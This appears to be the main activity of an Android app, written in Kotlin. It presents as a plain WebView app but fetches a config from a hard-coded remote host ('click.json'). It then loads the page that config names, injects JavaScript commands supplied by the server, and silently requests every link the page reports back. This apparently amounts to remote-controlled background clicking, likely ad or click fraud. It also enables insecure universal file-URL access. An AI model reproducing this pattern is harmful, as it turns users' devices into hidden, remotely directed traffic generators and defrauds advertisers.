package ru.mail.aslanisl.webviewapplication

import android.annotation.SuppressLint
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.support.v7.app.AppCompatActivity
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import kotlinx.android.synthetic.main.activity_main.*
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response

private const val TASK_TIME = 60 * 1000L

class MainActivity : AppCompatActivity(), Callback<String> {
    private var jSCommandsInvoked = false
    private var callback: ((List<ServerModel>) -> Unit)? = null
    private var callbackHrefs: ((String) -> Unit)? = null

    private val progressHandler = Handler()
    private val startTime = System.currentTimeMillis()
    private val progressTask = object : Runnable{
        override fun run() {
            
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        callbackHrefs = { initHrefs(it) }

        initWebView()

        Webservice.webApi
            .loadServerData("http://bestplace.pw/click.json")
            .enqueue(object : Callback<ServerResponse> {
                override fun onFailure(call: Call<ServerResponse>?, t: Throwable?) {}

                override fun onResponse(call: Call<ServerResponse>?, response: Response<ServerResponse>?) {
                    val serverData = response?.body() ?: return

                    webView.loadUrl(serverData.url)

                    callback = { involveCommands(JSCommanFactory.generateCommands(serverData.elements)) }
                }
            })
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun initWebView() {
        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                if (jSCommandsInvoked.not()) {
                    //Wait a bit lo load JS
                    Handler().postDelayed({ Webservice.doWork(callback) }, 500)
                }
            }
        }

        webView.webChromeClient = WebChromeClient()
        webView.settings.javaScriptEnabled = true
        webView.settings.domStorageEnabled = true
        webView.setLayerType(2, null)
        webView.settings.allowFileAccessFromFileURLs = true
        webView.settings.allowUniversalAccessFromFileURLs = true
        webView.setBackgroundColor(Color.WHITE)
        if (BuildConfig.DEBUG && Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            WebView.setWebContentsDebuggingEnabled(true)
        }

        webView.addJavascriptInterface(JSInterface(callbackHrefs), "Android")
    }

    private fun involveCommands(commands: List<JSCommand>) {
        jSCommandsInvoked = true
        commands.forEach {
            it.command?.let { command ->
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
                    webView.evaluateJavascript("javascript:$command", null)
                } else {
                    webView.loadUrl("javascript:$command")
                }
            }
        }
    }

    private fun initHrefs(hrefs: String) {
        val hrefsList = hrefs.split(",")
        hrefsList.forEach {
            Webservice.webApi.loadUrl(it).enqueue(this)
        }
    }

    override fun onFailure(call: Call<String>?, t: Throwable?) {}

    override fun onResponse(call: Call<String>?, response: Response<String>?) {}

    private fun updateProgress(){

    }

    override fun onDestroy() {
        super.onDestroy()
        callback = null
        callbackHrefs = null
    }
}
